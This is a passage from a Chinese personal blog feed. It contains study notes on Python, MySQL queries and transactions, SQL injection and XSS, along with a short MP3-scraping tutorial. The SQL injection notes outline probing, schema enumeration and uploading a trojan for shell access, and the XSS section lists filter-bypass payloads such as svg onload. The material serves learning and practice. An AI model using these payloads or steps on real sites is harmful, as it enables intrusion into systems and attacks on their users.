class="hljs-title function_">study</span>(<span class="hljs-params">self, course_name</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s正在学习%s.&#x27;</span> % (self.name, course_name))<br></code></pre></td></tr></table></figure><p>在Python中，属性和方法的<strong>访问权限只有两种</strong>，也就是<strong>公开的和私有的</strong>。</p><p>如果希望属性是私有的，在给属性命名时可以用两个下划线作为开头。</p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p><a href="https://github.com/baa-god/sql_node/blob/master/mysql/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">详细笔记</a>、<a href="http://c.biancheng.net/sql/what-is-sql.html">sql教程</a></p><p>MySQL是关系型数据库。</p><p><strong>登录</strong>：mysql -u 用户名 -p 密码</p><p><strong>切换数据库</strong>：use xxx;</p><p>数据库三大范式（<a href="https://www.zhihu.com/question/34953197?sort=created">简单理解</a>）：</p><p>第一范式：表中每一列的属性都不可再分.</p><p>第二范式：满足第一范式，且非主属性完全依赖于主属性.</p><p>第三范式：满足第二范式，且每个非主属性都不传递函数依赖于主属性.</p><h2 id="查询-常见"><a href="#查询-常见" class="headerlink" title="查询(常见)"></a><strong>查询</strong>(常见)</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询 teacher 表中不重复的 department 列</span><br><span class="hljs-comment">-- DISTINCT：删除结果集中所有重复的记录</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> department <span class="hljs-keyword">FROM</span> teacher;<br><br><span class="hljs-comment">-- 查询 score 表中成绩在60-80之间的所有行（区间查询和运算符查询）</span><br><span class="hljs-comment">-- BETWEEN xx AND xx: 查询区间, AND 表示 &quot;并且&quot;,OR表示”或者“</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> degree <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">60</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">80</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> degree <span class="hljs-operator">&gt;</span> <span class="hljs-number">60</span> <span class="hljs-keyword">AND</span> degree <span class="hljs-operator">&lt;</span> <span class="hljs-number">80</span>;<br><br><span class="hljs-comment">-- 查询 score 表中成绩为 85, 86 或 88 的行</span><br><span class="hljs-comment">-- IN: 查询规定中的多个值</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> degree <span class="hljs-keyword">IN</span> (<span class="hljs-number">85</span>, <span class="hljs-number">86</span>, <span class="hljs-number">88</span>);<br><br><span class="hljs-comment">-- 以 c_no 升序、degree 降序查询 score 表的所有行</span><br><span class="hljs-comment">-- DESC: 降序，从高到低</span><br><span class="hljs-comment">-- ASC（默认）: 升序，从低到高</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> c_no <span class="hljs-keyword">ASC</span>, degree <span class="hljs-keyword">DESC</span>;<br><br><span class="hljs-comment">-- 查询 &quot;95031&quot; 班的学生人数</span><br><span class="hljs-comment">-- COUNT: 统计</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> class <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;95031&#x27;</span>;<br><br><span class="hljs-comment">-- 查询 score 表中的最高分的学生学号和课程编号（子查询或排序查询）。</span><br><span class="hljs-comment">-- (SELECT MAX(degree) FROM score): 子查询，算出最高分</span><br><span class="hljs-keyword">SELECT</span> s_no, c_no <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> degree <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(degree) <span class="hljs-keyword">FROM</span> score);<br><br></code></pre></td></tr></table></figure><p><strong>ORDER BY</strong> 子句用于根据一个或者多个字段对查询结果（结果集）进行排序</p><p><strong>GROUP BY</strong> 子句用来根据指定的字段对结果集（选取的数据）进行分组.</p><p>借助 SQL 聚合函数，您可以对分组的数据进行再次加工，例如：</p><ul><li>SUM( ) 函数可以对指定字段的值进行求和；</li><li>COUNT( ) 函数可以计算某个分组内数据的条数；</li><li>AVG( ) 函数可以对指定字段的值求平均数。</li></ul><p><strong>LIKE</strong> 子句用于在 WHERE 语句中进行<strong>模糊匹配</strong>，它会将给定的匹配模式和某个字段进行比较，匹配成功则选取，否则不选取。</p><p><strong>HAVING</strong> 子句通常与 GROUP BY 子句一起使用，用来<strong>过滤</strong> GROUP BY 子句返回的分组结果集。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询 score 表中至少有 2 名学生选修，并以 3 开头的课程的平均分数。</span><br><span class="hljs-comment">-- 意味着c_no 要大于2，课程名3开头</span><br><span class="hljs-keyword">SELECT</span> c_no, <span class="hljs-built_in">AVG</span>(degree), <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> c_no<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(c_no) <span class="hljs-operator">&gt;=</span> <span class="hljs-number">2</span> <span class="hljs-keyword">AND</span> c_no <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;3%&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p>多表查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询所有学生的 name，以及该学生在 score 表中对应的 c_no 和 degree 。</span><br><span class="hljs-comment">-- FROM...: 表示从 student, score 表中查询</span><br><span class="hljs-comment">-- WHERE 的条件表示为，只有在 student.no 和 score.s_no 相等时才显示出来。</span><br><span class="hljs-keyword">SELECT</span> name, c_no, degree <span class="hljs-keyword">FROM</span> student, score <br><span class="hljs-keyword">WHERE</span> student.no <span class="hljs-operator">=</span> score.s_no;<br></code></pre></td></tr></table></figure><p><strong>AS</strong> 关键字用于为表或字段<strong>起一个临时的别名。</strong>别名是临时的，它仅在当前 SQL 语句中奏效，数据库中的实际表名和字段名不会更改。</p><p>通常在下列情况中使用别名：</p><ul><li>有两个名字重复的表，需要为其中一个表起一个别名加以区分，比如 <a href="http://c.biancheng.net/sql/self-join.html">SELF JOIN</a>。</li><li>两个表中有重复的字段名，起别名加以区分。</li><li>表名&#x2F;字段名较长，或者可读性差。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- YEAR(..): 取出日期中的年份</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">no</span>, name, birthday <span class="hljs-keyword">FROM</span> student<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">YEAR</span>(birthday) <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">YEAR</span>(birthday) <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">IN</span> (<span class="hljs-number">101</span>, <span class="hljs-number">108</span>));<br></code></pre></td></tr></table></figure><p><strong>UNION</strong> 子句&#x2F;运算符用于合并两个或者多个 SELECT 语句的结果集</p><ul><li>默认地，UNION 运算符会过滤掉两个结果集中重复的记录，只保留其中一条，也就是对两个结果集进行并集操作；此外，UNION 还会按照默认规则对结果集进行排序。</li><li>如果希望保留原始结果，使用UNION ALL</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- NOT: 代表逻辑非</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> teacher <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;计算机系&#x27;</span> <span class="hljs-keyword">AND</span> profession <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (<br>    <span class="hljs-keyword">SELECT</span> profession <span class="hljs-keyword">FROM</span> teacher <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;电子工程系&#x27;</span><br>)<br><span class="hljs-comment">-- 合并两个集</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> teacher <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;电子工程系&#x27;</span> <span class="hljs-keyword">AND</span> profession <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (<br>    <span class="hljs-keyword">SELECT</span> profession <span class="hljs-keyword">FROM</span> teacher <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;计算机系&#x27;</span><br>);<br><br><span class="hljs-comment">-- ANY: 符合SQL语句中的任意条件。</span><br><span class="hljs-comment">-- ALL: 符合所有的条件</span><br><span class="hljs-comment">-- 查询课程 3-105 且成绩 至少 高于 3-245 的 score 表。</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> c_no <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;3-105&#x27;</span> <span class="hljs-keyword">AND</span> degree <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">ANY</span>(<br>    <span class="hljs-keyword">SELECT</span> degree <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> c_no <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;3-245&#x27;</span><br>) <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> degree <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p><strong>Join</strong> 是“连接”的意思，顾名思义，SQL JOIN 子句用于将两个或者多个表联合起来进行查询。</p><p><strong>INNER JOIN(内连接)</strong> 是 SQL 中最重要、最常用的表连接形式，只有当连接的两个或者多个表中都存在满足条件的记录时，才返回行。</p><p><img src="http://c.biancheng.net/uploads/allimg/210824/092Z42610-0.gif" alt="inner join"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- INNER JOIN: 表示为内连接，将两张表拼接在一起。</span><br><span class="hljs-comment">-- on: 表示要执行某个条件。</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> person <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> card <span class="hljs-keyword">on</span> person.cardId <span class="hljs-operator">=</span> card.id;<br></code></pre></td></tr></table></figure><p><strong>LEFT JOIN(左连接)</strong> 和 **RIGHT JOIN(右连接)**是相对的，</p><ul><li>LEFT JOIN 将返回左表（table1）中的所有记录，即使右表（table2）中没有匹配的记录也是如此。当右表中没有匹配的记录时，LEFT JOIN 仍然返回一行，只是该行的左表字段有值，而右表字段以 NULL 填充。</li><li>RIGHT JOIN 将返回右表（table2）中的所有记录，即使左表（table1）中没有匹配的记录也是如此。当左表中没有匹配的记录时，RIGHT JOIN 仍然返回一行，只是该行的右表字段有值，而左表字段以 NULL 填充。</li></ul><p><img src="http://c.biancheng.net/uploads/allimg/210824/093001K37-0.gif" alt="left join"></p><p><img src="http://c.biancheng.net/uploads/allimg/210824/09330262M-0.gif" alt="right join"></p><p><strong>FULL JOIN(全连接)</strong> 将返回左表（table1）和右表（table1）中的所有记录，相当于 LEFT JOIN 和 RIGHT JOIN的叠加。(mysql不支持，使用union可实现效果)</p><p><img src="http://c.biancheng.net/uploads/allimg/210824/09350M4S-0.gif" alt="full join"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> person <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> card <span class="hljs-keyword">on</span> person.cardId <span class="hljs-operator">=</span> card.id<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> person <span class="hljs-keyword">RIGHT</span> <span class="hljs-keyword">JOIN</span> card <span class="hljs-keyword">on</span> person.cardId <span class="hljs-operator">=</span> card.id;<br></code></pre></td></tr></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>事务（ Transaction）由一次或者多次基本操作构成，或者说，事务由一条或者多条 SQL 语句构成。</p><p>在 MySQL 中，事务其实是一个最小的不可分割的工作单元。事务能够<strong>保证一个业务的完整性</strong>。</p><p>事务中的所有 SQL 语句是一个整体，共同进退，不可分割，<strong>要么全部执行成功，要么全部执行失败</strong>。</p><p>事务具有四个标准属性，分别是原子性（<strong>A</strong>tomicity，或称不可分割性）、一致性（<strong>C</strong>onsistency）、隔离性（<strong>I</strong>solation，又称独立性）、持久性（<strong>D</strong>urability），简称 <strong>ACID</strong>。（<a href="http://c.biancheng.net/sql/transaction.html">详解</a>)</p><p><strong>事务的隔离性可分为四种 ( 性能从低到高 )</strong> ：</p><ol><li><p><strong>READ UNCOMMITTED ( 读取未提交 )</strong></p><p>如果有多个事务，那么任意事务都可以看见其他事务的<strong>未提交数据</strong>。</p><p>脏读。</p></li><li><p><strong>READ COMMITTED ( 读取已提交 )</strong></p><p>只能读取到其他事务<strong>已经提交的数据</strong>。      </p><p>虽然 <strong>READ COMMITTED</strong> 让我们只能读取到其他事务已经提交的数据，但还是会出现问题，就是<strong>在读取同一个表的数据时，可能会发生前后不一致的情况</strong>。这被称为<strong>不可重复读现象 ( READ COMMITTED )</strong> 。</p></li><li><p><strong>REPEATABLE READ ( 可被重复读 )</strong></p><p>如果有多个连接都开启了事务，那么事务之间不能共享数据记录，否则只能共享已提交的记录。</p><p>可能会产生<strong>幻读</strong>。</p></li><li><p><strong>SERIALIZABLE ( 串行化 )</strong></p><p>所有的事务都会按照<strong>固定顺序执行</strong>，执行完一个事务后再继续执行下一个事务的<strong>写入操作</strong>。</p></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查看隔离级别</span><br><span class="hljs-comment">-- MySQL 8.x, GLOBAL 表示系统级别，不加表示会话级别。</span><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@GLOBAL</span>.TRANSACTION_ISOLATION;<br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@TRANSACTION</span>_ISOLATION;<br><br><span class="hljs-comment">-- MySQL 5.x</span><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@GLOBAL</span>.TX_ISOLATION;<br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@TX</span>_ISOLATION;<br><br><span class="hljs-comment">-- 设置隔离级别</span><br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> TRANSACTION ISOLATION LEVEL xxx(隔离类型);<br></code></pre></td></tr></table></figure><p>与事务控制有关的 SQL 命令包括：</p><ul><li>BEGIN 或者 START TRANSACTION：开始事务；(手动开启一个事务处理事件)</li><li>COMMIT：提交事务；（提交后不可回滚）</li><li>ROLLBACK：回滚事务；（回到最后一次提交数据的状态）</li><li>SAVEPOINT：在事务内部设置回滚标记点；</li><li>RELEASE SAVEPOINT：删除回滚标记点；</li><li>ROLLBACK TO：将事务回滚到标记点（ROLLBACK 命令的一种变形写法）。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询事务的自动提交状态(默认开启)</span><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@AUTOCOMMIT</span>;<br><span class="hljs-comment">-- 关闭自动提交</span><br><span class="hljs-keyword">SET</span> AUTOCOMMIT <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><strong>常见的注入类型</strong>：联合注入、布尔注入、报错注入、时间注入、堆叠注入、二次注入、宽字节注入、cookie注入等。</p><p><strong>SQL注入的产生需要两个条件</strong></p><ol><li>我们传递给后端的参数是可以控制的</li><li>参数内容会被带入到数据库查询</li></ol><p><strong>SQL Inject 漏洞攻击流程：</strong></p><ol><li><p><strong>注入点探测</strong></p><ol><li>自动方式：使用web漏洞扫描工具，自动进行注入点发现</li><li>手动方式：手工构造sql inject测试语句进行注入点发现</li></ol></li><li><p><strong>信息收集</strong></p><p>通过注入点取期望得到的数据</p><p>（1）环境信息：数据库类型，数据库版本，操作系统版本，用户信息等</p><p>（2）数据库信息：数据库名称，数据库表，表字段，字段内容，甚至加密的内容也可能会被破解</p><blockquote><p>mysql 5.0以上版本自带数据库，information_schema记录有当前mysql下所有数据库名，表名，列名信息。下列是存放各信息的名字</p><p>information_schema.schemata：记录数据库信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息的表<br>schema_name 数据库名<br>table_name 表名<br>column_name 列名<br>table_schema 数据库名</p></blockquote></li><li><p><strong>获取权限</strong></p><p>获取操作系统权限：通过数据库执行shell，上传木马</p></li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><strong>练习平台：</strong></p><p>xss【<a href="https://xss.haozi.me/#/0x00">在线平台</a> ｜<a href="https://sheepandbread.github.io/2020/11/03/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday4/index.html">笔记</a>】</p><p>pikachu</p><p>XSS（跨站脚本）概述</p><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。</p><p>XSS是一种前端漏洞，主要发生原因是前端没有对输入输出进行是当处理过滤。</p><p>常见的类型有：</p><p>1、反射性XSS（非持续型攻击，攻击者构造后【带xss的url】等待对方触发。一次型，不会写入数据库）</p><p>2、存储型XSS（持续型攻击，将跨站代码植入到网站数据库。一次成功，其他访问者都会收到攻击【例如留言板】）</p><p>3、DOM型XSS</p><p>​DOM即文档对象模型，是W3C制定的标准接口规范，是一种处理HTML和XML文件的标准API。</p><p>​只在前端。</p><p><strong>输入过滤</strong>：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</p><p><strong>输出转义</strong>：根据输出点的位置对输出到前端的内容进行适当转义;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;1&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 当()被过滤 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="hljs-symbol">&amp;#40;</span>1<span class="hljs-symbol">&amp;#41;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span>  <span class="hljs-comment">&lt;!-- &amp;#40是( ,也可以使用&amp;#96 ` --&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- 闭合被过滤 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span></span><br><span class="hljs-tag">     </span><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><strong>【mysql部分】</strong></p><p><a href="http://c.biancheng.net/sql/what-is-sql.html">http://c.biancheng.net/sql/what-is-sql.html</a></p><p>mysql笔记：<a href="https://github.com/baa-god/sql_node/blob/master/mysql/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">https://github.com/baa-god/sql_node/blob/master/mysql/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md</a></p><p><strong>【sql注入】</strong></p><p><a href="https://www.freebuf.com/articles/web/256097.html">https://www.freebuf.com/articles/web/256097.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello - New - World</title>
    <link href="/2023/03/19/2023/hello-world/"/>
    <url>/2023/03/19/2023/hello-world/</url>
    
    <content type="html"><![CDATA[<style>#box2{  width: 100px;  height: 50px;  background-color: #f8bf74;  border: solid 0px white;  border-radius: 50px;  margin-left: 50px;}#box3{  width: 200px;  height: 50px;  margin-left: 0px;  border-radius: 50px;  background-color: #fcce92;  border: solid 2px #d6650a;}#box3:before{  background-color: #fcce92;  content: '- 你好 :)  ';  color: #ffaa00;}#hia{  margin-top: 20px;  margin-left: 60px;  color: #d6650a;}#ha{  display: none;    margin-left: 60px;    margin-bottom: -5px;     width: 80px;}</style><script>  a = true;  function onclickFunny(){    a = false;    $("#ha").css("display","block");    setTimeout(function(){      $("#ha").css("display","none");    },2000);  }  function onmouse(x){    if (a) {    document.getElementById("box2").id = 'box3';    }  }  function outmouse(x){    if (a) {      document.getElementById("box3").id = 'box2';    }  } </script><h3 id="hia">重开博客！</h3><div id="box">  <img id="ha" src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E5%B0%8F%E5%85%B0.png">  <button id="box2" onmousemove="onmouse(this)" onclick="onclickFunny()"onmouseout="outmouse(this)">🍞</button></div><br/><p>究竟谁在我的网站上挂字母啊？:( </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>用beautifulsoup简单爬取英语音频</title>
    <link href="/2022/03/31/old/%E7%94%A8beautifulsoup%E7%AE%80%E5%8D%95%E7%88%AC%E5%8F%96%E8%8B%B1%E8%AF%AD%E9%9F%B3%E9%A2%91/"/>
    <url>/2022/03/31/old/%E7%94%A8beautifulsoup%E7%AE%80%E5%8D%95%E7%88%AC%E5%8F%96%E8%8B%B1%E8%AF%AD%E9%9F%B3%E9%A2%91/</url>
    
    <content type="html"><![CDATA[<p>环境：macbook pro</p><p>beautiful soup官方文档：<a href="https://beautifulsoup.readthedocs.io/zh_CN/latest/">https://beautifulsoup.readthedocs.io/zh_CN/latest/</a></p><p>urllib的菜鸟教程：<a href="https://www.runoob.com/python3/python-urllib.html">https://www.runoob.com/python3/python-urllib.html</a></p><p>很久没写python了，随便整个东西熟悉下（正好最近背单词，一个个下载真的好麻烦）。</p><h2 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h2><p>要下载的mp3在不同的页面，需要通过目录点进去后才能找到下载地址。</p><p>所以实现两个功能，下载和查找。</p><p>1.获得目录页所有单页的链接。</p><p>1.单页mp3链接的查找</p><p>2.下载mp3到指定目录</p><h2 id="2-实操"><a href="#2-实操" class="headerlink" title="2.实操"></a>2.实操</h2><p>先查看需要爬取的mp3的页面的源码。<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8A%E5%8D%8811.24.21.png" alt="截屏2022-03-30 上午11.24.21"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--源码--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;audio_media&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">preload</span>=<span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn14.bookln.cn/tm1022544_553b013e8f1b3b834e568e4304486fc5c071519b.mp3&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>要下载的音频在audio标签下，id为audio_media的src内。</p><p>搜索了整个页面，也就只有这一个audio标签。</p><p>所以获取这个标签下的src值即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>download_nrl=<span class="hljs-string">&quot;https://mp.zhizhuma.com/qr.html?crcode=120D62W6CDD&quot;</span><br>soup = BeautifulSoup(urlopen(download_nrl),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>mp3_all = soup.find_all(<span class="hljs-string">&#x27;audio&#x27;</span>)<br>  <span class="hljs-keyword">for</span> mp3_li <span class="hljs-keyword">in</span> mp3_all:  <span class="hljs-comment">#获取src</span><br>mp3 = mp3_li[<span class="hljs-string">&#x27;src&#x27;</span>]<br><span class="hljs-built_in">print</span>(mp3)<br></code></pre></td></tr></table></figure><p>成功获得了链接，使用urllib进行下载。</p><p>测试一下是否能下载成功。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#格式</span><br><span class="hljs-comment">#urllib.request.urlretrieve(url,path+name) #可不加路径</span><br><span class="hljs-keyword">import</span> urllib.request<br>mp3_url=<span class="hljs-string">&#x27;https://cdn14.bookln.cn/tm1022544_553b013e8f1b3b834e568e4304486fc5c071519b.mp3&#x27;</span><br><span class="hljs-keyword">try</span>:<br>name=<span class="hljs-string">&#x27;1.mp3&#x27;</span><br>urllib.request.urlretrieve(mp3_url,name)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下载完成。&quot;</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下载失败。&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.12.26.png" alt="截屏2022-03-30 